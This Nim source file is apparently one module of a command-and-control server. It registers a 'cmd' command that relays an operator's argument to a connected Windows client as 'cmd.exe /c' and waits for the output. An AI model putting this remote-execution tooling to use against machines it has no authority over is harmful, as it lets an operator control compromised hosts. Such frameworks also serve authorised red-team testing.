import asyncdispatch, strutils, tables

import ../../types, ../../communication, ../../logging

import ../../../clientTasks/shell

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  if len(args) < 1:
    errorLog "you must specify a command, check 'help cmd'"
    return
  let task = await shell.sendTask(server.cli.handlingClient, "cmd.exe /c " & args[0])
  await task.awaitResponse()

let cmd*: Command = Command(
  execProc: execProc,
  name: "cmd",
  argsLength: 1,
  usage: @["cmd \"[command]\""],
  cliMode: @[ClientInteractMode],
  description: "Run a command via cmd.exe (Windows only)",
  category: CCClientInteraction,
  requiresConnectedClient: true
)